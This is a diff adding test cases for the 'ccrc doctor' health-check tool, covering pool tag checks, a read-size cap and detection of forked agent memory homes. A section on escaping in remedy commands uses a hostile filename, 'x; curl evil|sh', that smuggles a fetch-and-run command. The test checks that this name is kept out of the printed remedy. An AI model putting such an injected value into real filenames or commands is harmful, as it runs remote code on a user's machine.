+    // generated projection whose `_ccrc_pool` case has no arms: readable,
+    // parseable, and empty. That is the fixture, and it goes through the
+    // generator rather than being hand-written, so the empty-case shape is
+    // the one `ccrc install` really emits.
+    //
+    // Mutation, measured: a scratchpad copy whose closing PASS branches on
+    // `[ -n "$known" ]` alone — the two-state shape — answers this fixture
+    // with the UNMEASURED sentence, i.e. tells the operator a file it just
+    // read could not be read. The third assertion below is the one that reds
+    // on it; the first two stay green, which is the whole defect.
+    const home = healthy('ccrc-doctor-pools-nopools-');
+    seedAccountsSh(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain('carries NO pools at all');
+    expect(line, 'the projection was readable — saying otherwise is the defect this pins')
+      .not.toContain('could not be read');
+    expect(line).not.toContain("names a pool this box's roster carries");
+  });
+
+  it('DOES claim the roster half when ~/.ccrc/accounts.sh was read', () => {
+    // The mirror, and without it the pin above is satisfied by a check that
+    // never claims the third clause at all — which would be a doctor that
+    // stopped reporting the orphan arm's agreement entirely.
+    //
+    // Mutation, measured: a scratchpad copy whose final PASS is only the
+    // UNMEASURED sentence answers this fixture with it, and this test reds
+    // while the one above stays green.
+    const home = healthy('ccrc-doctor-pools-vocab-');
+    pooledRoster(home);
+    project(home, 'demo');
+    tag(home, 'demo', 'pool-a');
+    const line = lineFor(runDoctor(home).stdout, 'pools');
+    expect(line).toMatch(/^PASS pools: /);
+    expect(line).toContain("names a pool this box's roster carries");
+    expect(line).not.toContain('UNMEASURED');
+  });
+
+  // ── A FILESYSTEM-DERIVED NAME MAY NOT RIDE INSIDE A COMMAND ─────────────
+  // The `pools-stale` remedy is the exact command an operator is invited to
+  // paste, and its `<project>` argument is a FILENAME read off disk. A tag
+  // file named `x; curl evil|sh` rendered `remedy: clear each: ccd
+  // project-pool --project x; curl evil|sh --clear` — three commands, two of
+  // them the filename's. Not an escalation (writing under `pools/` already
+  // needs code execution as this user), and that is exactly why it is worth
+  // fixing rather than arguing about: this check's whole value is that what
+  // it prints can be trusted.
+  //
+  // THE TWO SURFACES ARE DIFFERENT AND ONLY ONE IS FILTERED. The verdict
+  // MESSAGE still names the file — it is printed, never executed, and an
+  // operator who cannot see the offending name cannot go delete it. The
+  // REMEDY is the one an operator runs, so the charset gate lives there.
+  it('keeps a hostile stale FILENAME out of the remedy while still naming it in the verdict', () => {
+    // Mutation, measured: a scratchpad copy with the charset gate reverted
+    // (every stale name appended to `p_stale_cmds` unfiltered, the omission
+    // counter gone) answers this fixture `remedy: clear each: ccd project-pool
+    // --project x; curl evil|sh --clear` — which reds the three remedy
+    // assertions below (no `curl`, the omission sentence, the count). The
+    // `/^ {2}remedy: \S/` shape assertion and BOTH verdict assertions stay
+    // green on that copy, which is the point of asserting them: the defect
+    // was never a missing line or a missing name.
+    const home = healthy('ccrc-doctor-pools-stale-hostile-');
+    pooledRoster(home);
+    const hostile = 'x; curl evil|sh';
+    tag(home, hostile, 'pool-a');   // no projects/<name>, no *.project row
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
+    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain(hostile);
+    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
+    expect(lines[i + 1]).not.toContain('curl');
+    expect(lines[i + 1]).toContain('NOT printed as a command');
+    expect(lines[i + 1]).toMatch(/\b1 name/);
+  });
+
+  it('still prints the exact clear command for an ordinary stale name on the same box', () => {
+    // The companion, and it is not decoration: a gate that omitted EVERY name
+    // would satisfy the test above completely while leaving the remedy with
+    // no command in it at all — a WARN whose cure is "go work it out". One
+    // box, two stale tags, and the remedy has to carry the legal one's exact
+    // command AND the count of what it would not print.
+    //
+    // Mutation, measured: a scratchpad copy whose `case` omits every name
+    // (`*) p_stale_omit=$((p_stale_omit + 1)); continue ;;`) answers this
+    // fixture `remedy: 2 name(s) are NOT printed as a command: …` with no
+    // `ccd project-pool` in it — which reds the first and third assertions
+    // below (the count moves to 2 as well), while the `curl` one stays green:
+    // omitting everything is safe and useless, and only the command half
+    // says so.
+    const home = healthy('ccrc-doctor-pools-stale-mixed-');
+    pooledRoster(home);
+    tag(home, 'x; curl evil|sh', 'pool-a');
+    tag(home, 'quiet-basin', 'pool-a');
+    const lines = runDoctor(home).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
+    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
+    expect(lines[i + 1]).not.toContain('curl');
+    expect(lines[i + 1]).toMatch(/\b1 name/);
+  });
+
+  // ── THE DOCTOR'S OWN SIZE CAP (fix round 7) ──────────────────────────────
+  // `read -r -d '' -n 64` is the READER's gate, inherited here for the reason
+  // every per-tag arm in this loop is: a doctor that read a tag differently
+  // from the file that obeys it reports on a rule nobody enforces. Twice the
+  // 32-character grammar, so no legal tag can reach it; without it a
+  // `pools/<p>` symlinked at a growing log is slurped whole into a variable
+  // by the one tool an operator runs when the box is already sick.
+  //
+  // THE WHITESPACE PAIR IS WHAT DETECTS THE MUTATION, and a big junk file is
+  // NOT — the same fact `ccd`'s own cap test rests on. Measured on a
+  // scratchpad copy with `-n 64` removed:
+  //     `pool-a` + 100 spaces (106 bytes) -> PASS      (tree: pools-malformed)
+  //     `pool-a` +  50 spaces  (56 bytes) -> PASS      (tree: PASS)
+  //     1 MB of junk                      -> pools-malformed, WITH AND
+  //                                          WITHOUT the cap
+  // The junk file answers malformed either way because its bytes are not a
+  // pool name whether 64 of them or a million are read. What DOES tell the
+  // two builds apart is a file that is LEGAL WHEN READ WHOLE and longer than
+  // the cap — trailing whitespace being the cheapest such tail, since the
+  // strip would make it legal. Re-measured in the same round, because the
+  // sentence that stood here named a different criterion ("first 64 bytes
+  // legal, tail not") and was false: `pool-a` + 58 spaces + `!!!` (67 bytes)
+  // matches THAT description and answers `pools-malformed` on the tree and on
+  // the cap-deleted copy alike, telling the builds apart not at all. Nor does
+  // the over-cap row reach the strip or the grammar test: `read -r -d '' -n 64`
+  // stops short of EOF, returns 0, and the `p_malformed` bucket in
+  // `_check_pools` takes it immediately, before any strip or grammar test.
+  it('caps its read: 106 bytes of tag is malformed, 56 bytes is legal', () => {
+    // WHAT THIS PAIR IS EVIDENCE FOR, EXACTLY: a cap somewhere in [56, 105].
+    // It is not evidence for 64, and it is not evidence that the number is
+    // the READER's — a `-n 80` build keeps both halves green (measured), and
+    // nothing in this file compares the two literals. The title used to say
+    // "applies the reader's 64-byte cap" and measured neither word. The
+    // cross-file half is pinned where this repo pins cross-file spellings:
+    // `pool-name-parity.test.ts` holds the doctor's `-n` literal equal to
+    // `ccd/ccd`'s, alongside the grammar and the directory name.
+    //
+    // Mutation, measured, in the OTHER direction too: a copy with the cap
+    // TIGHTENED to `-n 8` answers the 56-byte fixture `FAIL pools:
+    // pools-malformed` — so the second half below is a pin on the cap's
+    // value being large enough, not only on its presence.
+    const over = healthy('ccrc-doctor-pools-overcap-');
+    pooledRoster(over);
+    project(over, 'demo');
+    tag(over, 'demo', `pool-a${' '.repeat(100)}`);
+    const lines = runDoctor(over).stdout.split('\n');
+    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
+    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
+    expect(lines[i]).toContain('demo');
+
+    const under = healthy('ccrc-doctor-pools-undercap-');
+    pooledRoster(under);
+    project(under, 'demo');
+    tag(under, 'demo', `pool-a${' '.repeat(50)}`);
+    const line = lineFor(runDoctor(under).stdout, 'pools');
+    expect(line, 'a 56-byte tag is under the cap and strips to a legal name').toMatch(/^PASS pools: /);
   });
 });
 
@@ -5460,5 +6193,374 @@ describeLinux('ccrc doctor: scopes', () => {
     const home = healthy('ccrc-doctor-scopes-none-');
     rmSync(join(home, 'fixture-scopes'), { force: true });
     expect(runDoctor(home).stdout).toMatch(/^SKIP scopes: no tmux pane scopes/m);
+  });
+});
+
+// ── memory ───────────────────────────────────────────────────────────────
+//
+// Task 4 of 2026-09-09-project-scoped-memory. `_check_memory` is the detector:
+// the spec's whole premise is that a fork is currently SILENT, so this check's
+// entire job is to make one loud. THREE conditions — "forked" (a pair has
+// already diverged; the remedy is `ccrc memory --apply`), "unreachable" (a
+// home the session hook can never wire up, so it *will* fork on first use;
+// the remedy is roster/settings.json) and, since fix round 2, "unmeasured"
+// (settings.json exists but could not be READ, a WARN distinct from both
+// hard FAILs) — get different bodies and different remedies on purpose (task
+// brief, "Why three conditions and not two"; R22/R23 add the third).
+//
+// R33 (controller ruling, whole-branch review): "forked" is a WARN, not a
+// FAIL. `cmd_install` ends with `cmd_doctor`, whose non-zero exit on any FAIL
+// hard-dies `ccrc update` before its supervisor sweep ever runs, and `forked`
+// FAILs by construction on every multi-home box until the operator runs the
+// one irreversible `ccrc memory --apply` — so an unrelated verb was coercing
+// that migration. "unreachable" stays a FAIL: it names a misconfiguration,
+// not an expected pre-migration state. The tests below were all written
+// against the pre-R33 FAIL and are updated in place, not reworded around it —
+// see `_check_memory`'s own comments in ccd/ccrc-doctor-checks for the fuller
+// reasoning.
+//
+// `healthy()` plants no `.claude*` directory at all, so these tests build
+// agent homes by hand under each fixture's own `home`.
+//
+// EVERY FIXTURE HOME BELOW THAT PARTICIPATES IN A FORKED/CONVERGED ASSERTION
+// ALSO GETS A `settings.json` NAMING session-hook.sh (`HOOKED_SETTINGS`) —
+// fix round 2, R22: since a home with `projects/` and no settings.json at
+// all is now (correctly) ITS OWN unreachable finding, a fixture that means
+// to test only forked/converged would otherwise also trip unreachable on the
+// same home and muddy what a failing assertion is pinning.
+const HOOKED_SETTINGS =
+  '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"bash \\"$HOME/.cc-sessions/session-hook.sh\\""}]}]}}';
+
+describe('ccrc doctor: memory (spec 2026-09-08 §4, task 4)', () => {
+  it('PASSes on a box where every pair is converged — including the vacuous case of no agent homes at all', () => {
+    const home = healthy('ccrc-doctor-mem-ok-');
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^PASS memory: /m);
+  });
+
+  // Not vacuous this time: a real symlink to a real, existing store. This is
+  // the check's `-ef` comparison (see the function's own header comment) doing
+  // its actual job rather than never firing — a mutation that broke `-ef`
+  // into always-false would turn this PASS into a false FAIL.
+  it('PASSes a genuinely converged pair, not just the vacuous no-homes case', () => {
+    const home = healthy('ccrc-doctor-mem-converged-');
+    const d = join(home, '.claude', 'projects', '-p-demo');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const store = join(home, '.ccrc', 'memory', '-p-demo');
+    mkdirSync(store, { recursive: true });
+    symlinkSync(store, join(d, 'memory'));
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^PASS memory: /m);
+  });
+
+  // R20 (fix round 2, Important 1): a RELATIVE link that genuinely resolves
+  // to the canonical store used to read as `forked` under a raw `readlink`
+  // text comparison against the absolute store path — the memory really is
+  // shared into the one store, only the link's own spelling differs. `-ef`
+  // (device+inode, followed through the symlink) answers the real question
+  // regardless of how the target is spelled.
+  it('PASSes when a RELATIVE symlink correctly resolves to the canonical store (R20)', () => {
+    const home = healthy('ccrc-doctor-mem-relative-');
+    const d = join(home, '.claude', 'projects', '-p-demo');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const store = join(home, '.ccrc', 'memory', '-p-demo');
+    mkdirSync(store, { recursive: true });
+    symlinkSync(path.relative(d, store), join(d, 'memory'));
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^PASS memory: /m);
+  });
+
+  // R20 (fix round 2, Important 1 — the WORSE of the two measured bugs): a
+  // link resolving to something that EXISTS but is a plain FILE, not a
+  // directory, passed `-ef` alone while being just as unusable a memory
+  // store as a dangling link — and it does not even LOOK dangling. `[ -d
+  // "$store" ]` is what this test pins as a SEPARATE, independently mutable
+  // conjunct from `-ef`.
+  it('WARNs (forked) when the store exists but is a regular FILE, not a directory (R20, R33)', () => {
+    const home = healthy('ccrc-doctor-mem-store-is-file-');
+    const d = join(home, '.claude', 'projects', '-p-demo');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const store = join(home, '.ccrc', 'memory', '-p-demo');
+    mkdirSync(join(home, '.ccrc', 'memory'), { recursive: true });
+    writeFileSync(store, '');   // the "store" is a FILE, not a directory
+    symlinkSync(store, join(d, 'memory'));
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked across agent homes: .*\.claude:-p-demo/m);
+  });
+
+  it('WARNs and names the home and project when a pair is forked (plain directory, not a symlink) (R33)', () => {
+    const home = healthy('ccrc-doctor-mem-fork-');
+    const d = join(home, '.claude', 'projects', '-p-demo', 'memory');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(d, 'a.md'), 'x');
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked across agent homes: .*\.claude:-p-demo/m);
+    const i = r.stdout.split('\n').findIndex((l) => l.startsWith('WARN memory:'));
+    expect(r.stdout.split('\n')[i + 1]).toMatch(/^ {2}remedy: .*ccrc memory --apply/);
+    // R33: a forked-only box is a WARN, not a FAIL — `ccrc update` (which ends
+    // in `cmd_doctor`) must not hard-die over the expected pre-migration
+    // state of a multi-home box.
+    expect(r.stdout).not.toMatch(/^FAIL memory:/m);
+    expect(r.code).toBe(0);
+  });
+
+  // R4: the brief's fork fixture seeds a plain DIRECTORY, which a mutation
+  // that "treats any symlink as converged, ignoring the target" (M3) would
+  // still fail correctly on, because a directory is not a symlink at all.
+  // This fixture is the one M3 actually has to answer to: a symlink that
+  // IS a symlink, but points at the wrong place.
+  it('WARNs and names the pair when the symlink exists but points at the wrong target (R4, R33)', () => {
+    const home = healthy('ccrc-doctor-mem-wrong-target-');
+    const d = join(home, '.claude', 'projects', '-p-demo');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const elsewhere = join(home, 'elsewhere');
+    mkdirSync(elsewhere, { recursive: true });
+    symlinkSync(elsewhere, join(d, 'memory'));
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked across agent homes: .*\.claude:-p-demo/m);
+  });
+
+  // R12 (review round 2, extended here from Task 2's `_mem_state`): a link
+  // whose TEXT already names the canonical store, but whose store directory
+  // does not exist, is NOT converged — `ccrc memory --apply` still has work
+  // to do on it, and a doctor that PASSed here would be the exact silence
+  // this task exists to remove, one layer down. This also exercises R10: a
+  // dangling symlink like this one is invisible to a bare `[ -e "$link" ]`.
+  it('WARNs, not PASSes, when the link already points at the correct store but the store does not exist (R12, R33)', () => {
+    const home = healthy('ccrc-doctor-mem-dangling-');
+    const d = join(home, '.claude', 'projects', '-p-demo');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const store = join(home, '.ccrc', 'memory', '-p-demo');
+    symlinkSync(store, join(d, 'memory'));   // store deliberately never created
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked across agent homes: .*\.claude:-p-demo/m);
+  });
+
+  // R33 (controller ruling, whole-branch review Important — "none of
+  // `_check_memory`'s three verdict→rc assignments has a red test"): each of
+  // the three `rc=`/`[ "$rc" -eq 1 ] || rc=2` lines gets its own dedicated
+  // fixture here, isolated so exactly one of the three findings fires, and
+  // pins BOTH the printed verdict word AND `cmd_doctor`'s own worst-class
+  // cross-check (`ccd/ccrc:2048`-`:2063`) — deleting any one of the three
+  // lines leaves the WARN/FAIL text unchanged (that text is printed by
+  // `_dr_warn`/`_dr_fail` unconditionally) but desyncs the check's return code
+  // from what it printed, which `cmd_doctor` catches as a bug and reports as
+  // an EXTRA `FAIL memory: the check exited …` line — invisible to a test
+  // that only regexes for the original verdict line, which is exactly why
+  // R21/R23's existing assertions above did not catch it.
+  it('a forked-only box: WARN, no synthetic bug line, exit 0 (pins the forked rc=2 assignment)', () => {
+    const home = healthy('ccrc-doctor-mem-rc-forked-');
+    const d = join(home, '.claude', 'projects', '-p-demo', 'memory');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(d, 'a.md'), 'x');
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked/m);
+    expect(r.stdout).not.toMatch(/^FAIL memory:/m);
+    expect(r.stdout).not.toMatch(/the check exited/);
+    expect(r.code).toBe(0);
+  });
+
+  it('an unreachable-only box: exactly one FAIL memory line, no synthetic bug line, exit 1 (pins the unreachable rc=1 assignment)', () => {
+    const home = healthy('ccrc-doctor-mem-rc-unreach-');
+    const h = join(home, '.claude-glm');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    writeFileSync(join(h, 'settings.json'), '{}');
+    const r = runDoctor(home);
+    const failLines = r.stdout.split('\n').filter((l) => l.startsWith('FAIL memory:'));
+    expect(failLines).toEqual(['FAIL memory: agent homes the session hook cannot reach, so they will fork on first use: .claude-glm']);
+    expect(r.stdout).not.toMatch(/the check exited/);
+    expect(r.code).toBe(1);
+  });
+
+  it('an unmeasured-only box: WARN, no synthetic bug line, exit 0 (pins the unmeasured rc=2 assignment)', () => {
+    const home = healthy('ccrc-doctor-mem-rc-unmeasured-');
+    const h = join(home, '.claude-corp');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    const settings = join(h, 'settings.json');
+    writeFileSync(settings, HOOKED_SETTINGS);
+    chmodSync(settings, 0o000);
+    try {
+      const r = runDoctor(home);
+      expect(r.stdout).toMatch(/^WARN memory: could not tell whether the session hook reaches/m);
+      expect(r.stdout).not.toMatch(/^FAIL memory:/m);
+      expect(r.stdout).not.toMatch(/the check exited/);
+      expect(r.code).toBe(0);
+    } finally {
+      chmodSync(settings, 0o644);   // afterEach's rmSync must still be able to clean up
+    }
+  });
+
+  it('FAILs differently for a home the session hook can never reach, and does not confuse it with a fork', () => {
+    const home = healthy('ccrc-doctor-mem-unreach-');
+    const h = join(home, '.claude-glm');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    writeFileSync(join(h, 'settings.json'), '{}');
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^FAIL memory: agent homes the session hook cannot reach.*\.claude-glm/m);
+    const i = r.stdout.split('\n').findIndex((l) => l.startsWith('FAIL memory:'));
+    expect(r.stdout.split('\n')[i + 1]).toMatch(/^ {2}remedy: .*install-session-hooks\.sh/);
+    // Pin that this is NOT the forked remedy — the two bodies must stay
+    // distinguishable, which is the entire point of "three conditions never
+    // two" (R13: a bare `/FAIL memory/` match would not catch a collapse).
+    expect(r.stdout).not.toContain('ccrc memory --apply');
+  });
+
+  // R22 (fix round 2, Important 3): `install-session-hooks.sh:107-115` writes
+  // `cur='{}'` and inserts the hook for ANY rostered home lacking a
+  // settings.json at all — so absence itself proves the installer has never
+  // touched this home, the MAXIMAL case of "will fork on first use". Measured
+  // before this fix: `.claude-kimi/projects/` with no settings.json at all
+  // read as `PASS memory: … every agent home converged`.
+  it('reports a home unreachable when it has projects/ but no settings.json at all (R22)', () => {
+    const home = healthy('ccrc-doctor-mem-no-settings-');
+    const h = join(home, '.claude-kimi');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^FAIL memory: agent homes the session hook cannot reach.*\.claude-kimi/m);
+  });
+
+  // R23 Minor (fix round 2): "I could not read it" and "it is definitely not
+  // wired" are different facts an operator fixes differently (a permissions
+  // fix vs. a roster/settings.json edit) — D-1350's rule ("an adapter may not
+  // narrow a distinction it received") applied to this check's own settings
+  // .json read. An unreadable file must WARN as unmeasured, never silently
+  // promote to the FAIL a confirmed-absent hook gets.
+  //
+  // THE STDERR ASSERTION IS THE OTHER HALF OF R23, and it is the half no
+  // stdout assertion in this file can see. The pre-fix code attempted the
+  // open and hung a `2>/dev/null` off the `done <` line to quieten it, which
+  // does NOT work: redirections are set up left to right, so the trailing
+  // `2>` is not yet in force when the `<` that precedes it fails, and bash's
+  // own `Permission denied` diagnostic reaches the REAL stderr. Measured
+  // standalone (fix round 1): `while … done < <mode-000 file> 2>/dev/null`
+  // still prints `bash: line 1: …: Permission denied`. `[ -r … ]` refusing to
+  // attempt the open at all is what makes the WARN path clean, so this test
+  // pins the silence as well as the classification — without this line,
+  // deleting `-r` reds only on the WARN and the leak rides along unmeasured.
+  it('WARNs, not FAILs, when settings.json exists but cannot be read (R23)', () => {
+    const home = healthy('ccrc-doctor-mem-unreadable-');
+    const h = join(home, '.claude-corp');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    const settings = join(h, 'settings.json');
+    writeFileSync(settings, HOOKED_SETTINGS);
+    chmodSync(settings, 0o000);
+    try {
+      const r = runDoctor(home);
+      expect(r.stderr).not.toMatch(/Permission denied/);
+      expect(r.stdout).toMatch(/^WARN memory: could not tell whether the session hook reaches.*\.claude-corp/m);
+      expect(r.stdout).not.toMatch(/^FAIL memory: agent homes the session hook cannot reach.*\.claude-corp/m);
+    } finally {
+      chmodSync(settings, 0o644);   // afterEach's rmSync must still be able to clean up
+    }
+  });
+
+  // Guard test (Global Constraints: every guard ships with a red-when-deleted
+  // test). A scratch slug is a cwd the harness mints for every directory a
+  // session starts in; converging (or reporting) them would fill the census
+  // with noise about directories nobody will ever read. Each fixture LOOKS
+  // forked (a plain, non-symlink `memory` directory) and must never reach the
+  // verdict.
+  //
+  // FOUR PREFIXES, ONE RULE (D-2375): `/tmp` on Linux, and on Darwin
+  // `/private/tmp` plus a per-user `/var/folders/<x>/<y>/T`. `_check_memory`
+  // reads a directory NAME, so all four are measurable on a Linux runner —
+  // unlike the hook's own copy, which derives its slug from a live cwd and can
+  // only be measured where it runs. That asymmetry is why the Linux-only
+  // spelling survived to `test-macos`.
+  for (const slug of SCRATCH_SLUGS) {
+    it(`skips the scratch project slug ${slug} even when it looks forked`, () => {
+      const home = healthy('ccrc-doctor-mem-tmp-skip-');
+      const d = join(home, '.claude', 'projects', slug, 'memory');
+      mkdirSync(d, { recursive: true });
+      writeFileSync(join(d, 'a.md'), 'x');
+      writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+      const r = runDoctor(home);
+      expect(r.stdout).toMatch(/^PASS memory: /m);
+    });
+  }
+
+  // THE NEGATIVE CONTROL for that list. `/var/tmp` is POSIX *persistent*
+  // scratch, not the OS scratch root, and it is where `session-hook.test.ts`
+  // roots every project fixture it owns — so a widening that swept it up would
+  // hide a real fork from the operator, which is the one thing this check
+  // exists to report. Without this row, widening the list has no upper bound
+  // any suite can see.
+  for (const slug of PERSISTENT_SLUGS) {
+    it(`still WARNs about a forked ${slug} — persistent scratch is not the scratch root`, () => {
+      const home = healthy('ccrc-doctor-mem-vartmp-');
+      const d = join(home, '.claude', 'projects', slug, 'memory');
+      mkdirSync(d, { recursive: true });
+      writeFileSync(join(d, 'a.md'), 'x');
+      writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+      const r = runDoctor(home);
+      expect(r.stdout).toMatch(
+        new RegExp(`^WARN memory: memory is forked across agent homes: .*\\.claude:${slug}`, 'm'));
+    });
+  }
+
+  // `.claude-docserver` is NO LONGER special-cased (Minor, whole-branch
+  // review round 3 — reached independently for this file's own reason, see
+  // `_check_memory`'s comments in ccd/ccrc-doctor-checks): hard-coding a
+  // single operator's box-local tool name into shipped, public-release-bound
+  // source is the residue class CLAUDE.md bans, and on every measured box the
+  // exclusion excluded nothing the generic `[ -d "${h}projects" ]` guard did
+  // not already exclude. So a `.claude-docserver`-named directory is now
+  // examined like any other `.claude*` home — this test used to pin a PASS
+  // here (the old guard test) and now pins the opposite: a `projects/` dir
+  // under that name is real evidence, and doctor reports it like it would for
+  // any other home.
+  it('no longer special-cases .claude-docserver — a forked pair there is reported like any other home', () => {
+    const home = healthy('ccrc-doctor-mem-docserver-skip-');
+    const d = join(home, '.claude-docserver', 'projects', '-p-demo', 'memory');
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(d, 'a.md'), 'x');
+    writeFileSync(join(home, '.claude-docserver', 'settings.json'), HOOKED_SETTINGS);
+    const r = runDoctor(home);
+    expect(r.stdout).toMatch(/^WARN memory: memory is forked across agent homes: .*\.claude-docserver:-p-demo/m);
+  });
+
+  // R21 (fix round 2, Important 2): round 1's "emit exactly one verdict line"
+  // instruction was wrong twice over — `cmd_doctor` counts verdict LINES, not
+  // a fixed arity per check, and this file's own header already rules that
+  // two distinct hard findings are two distinct operator actions and get two
+  // lines, each with its own remedy. A fork on one home and an unreachable
+  // finding on an unrelated home are independent facts; dropping either one
+  // to keep to "one line" is exactly the silence this task exists to end.
+  //
+  // SINCE R33 THIS IS A WARN LINE AND A FAIL LINE, not two FAILs: forked is
+  // demoted, unreachable is not, and the worst-class cross-check
+  // (`ccd/ccrc:2048`-`:2063`) still has to pick FAIL as the check's return
+  // code — this test pins that too (`r.code`), which the pre-R33 version of
+  // this test never needed to.
+  it('prints a WARN line and a FAIL line, each with its own remedy, when a box is both forked and unreachable (R33)', () => {
+    const home = healthy('ccrc-doctor-mem-both-');
+    const forkedDir = join(home, '.claude', 'projects', '-p-demo', 'memory');
+    mkdirSync(forkedDir, { recursive: true });
+    writeFileSync(join(forkedDir, 'a.md'), 'x');
+    writeFileSync(join(home, '.claude', 'settings.json'), HOOKED_SETTINGS);
+    const h = join(home, '.claude-glm');
+    mkdirSync(join(h, 'projects'), { recursive: true });
+    writeFileSync(join(h, 'settings.json'), '{}');
+    const r = runDoctor(home);
+    const lines = r.stdout.split('\n');
+    const verdictLines = lines.filter((l) => /^(PASS|WARN|FAIL|SKIP) memory: /.test(l));
+    expect(verdictLines.length).toBe(2);
+    const forkedIdx = lines.findIndex((l) => l.startsWith('WARN memory: memory is forked across agent homes:'));
+    const unreachIdx = lines.findIndex((l) => l.startsWith('FAIL memory: agent homes the session hook cannot reach'));
+    expect(forkedIdx).toBeGreaterThanOrEqual(0);
+    expect(unreachIdx).toBeGreaterThanOrEqual(0);
+    expect(lines[forkedIdx]).toContain('.claude:-p-demo');
+    expect(lines[unreachIdx]).toContain('.claude-glm');
+    expect(lines[forkedIdx + 1]).toMatch(/^ {2}remedy: .*ccrc memory --apply/);
+    expect(lines[unreachIdx + 1]).toMatch(/^ {2}remedy: .*install-session-hooks\.sh/);
+    expect(r.stdout).not.toMatch(/the check exited/);
+    expect(r.code).toBe(1);
   });
 });
